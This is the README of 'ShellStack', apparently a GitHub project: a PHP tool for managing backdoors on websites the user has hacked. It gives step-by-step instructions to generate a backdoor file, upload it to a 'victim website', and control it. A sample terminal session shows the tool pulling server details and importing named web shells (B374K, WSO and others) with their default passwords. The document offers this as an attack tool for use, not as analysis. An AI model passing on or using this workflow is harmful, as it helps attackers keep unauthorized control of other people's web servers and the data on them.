# ShellStack 
#### Version 1.0
#### Coded By R3D#@X0R_2H1N A.K.A Tuhinshubhra
----
ShellStack is a PHP based backdoor management tool. This Tool comes handy for "HACKERS" who wish to keep a track of every website they hack. The tool generates a backdoor file which you just have to upload to the site and put the backdoor URL in the shells.txt present in the tool's directory.

# With ShellStack You can
- Import PHP Shells
- Get Server Details
- Upload Files From Your System using your terminal
- And Above all You Can Manage Your Backdoors Efficiently

# How To Use
1. `git clone https://github.com/Tuhinshubhra/shellstack`
2. `cd shellstack`
3. `php shellstack.php`
4. `generatebd` and exit the tool use `CTRL + C` - This will generate a backdoor file in the same directory as of the tool in a file named **backdoor.php**
5. Upload The Backdoor File To The Victim website
6. Copy The Backdoor URL and paste it in the **shells.txt** file present in the tool's directory and save it (*Each backdoor is separated by a new line*)
7. `php shellstack.php`
8. Enter The **Serial No** Assigned To The Backdoor
9. Rest is pretty Self explanatory

**Watch The Video Here:** https://youtu.be/umk3ZNZ5Y1I

# Requirements
``` 
php
curl 
```
# Example
```
root@R3D_MACH1N3:/home/redhaxor/Desktop/shellstack# php shellstack.php


________________________________________________________________________________
_______ _     _ _______               _______ _______ _______ _______ _     _
|______ |_____| |______ |      |      |______    |    |_____| |       |____/
______| |     | |______ |_____ |_____ ______|    |    |     | |_____  |    \_
________________________________________________________________________________

                    Simple Backdoor Management System
                    Coded By R3D#@x0R_2H1N A.K.A Tuhinshubhra 
                    Shout Out: LulZSec India  
================================================================================



List Of Backdoors:

0. http://localhost/backdoor.php
=============================================

[#] Enter Either Of These (Backdoor No.|help|generatebd) : 0

[+] Shell Selected: http://localhost/backdoor.php
[+] Validating Backdoor: Backdoor Found!

List Of Actions
================
[1] Import PHP Shells
[2] Server Details
[3] Remove Backdoor
[4] Remote File Upload
[5] Exit

[#] Select Option(1|2|3|4|5):2

[+] Server Info
[i] Sending Request And Getting Response...
[i] Server: Linux R3D_MACH1N3 4.9.0-kali4-amd64 #1 SMP Debian 4.9.30-1kali1 (2017-06-06) x86_64
[i] Server IP: 127.0.0.1


Press Enter To Continue


List Of Actions
================
[1] Import PHP Shells
[2] Server Details
[3] Remove Backdoor
[4] Remote File Upload
[5] Exit

[#] Select Option(1|2|3|4|5):1


List Of Shells
===============
[1] Dhanush shell {User & Pass : shellstack123}
[2] B374K shell {Pass : shellstack123}
[3] Kurama shell V.1.0 {Pass : red}
[4] WSO shell {Pass : shellstack123}
[5] MiNi shell {User & Pass : shellstack123}

[#] Select Shell To Import(1-5):1


[i] Importing Shell...
[i] Sending Request And Getting Response...
[R] Dhanush Shell Imported Successfully To /var/www/html/dhanush.php


Press Enter To Continue


List Of Actions
================
[1] Import PHP Shells
[2] Server Details
[3] Remove Backdoor
[4] Remote File Upload
[5] Exit

[#] Select Option(1|2|3|4|5):5
root@R3D_MACH1N3:/home/redhaxor/Desktop/shellstack# 

```
# Release(s)
> Version 1.0 On 14-06-2017

# screenshots

![Alt text](http://oi68.tinypic.com/2mybzo3.jpg "Screenshot")
![Alt text](http://oi64.tinypic.com/2yycs1t.jpg "Screenshot")
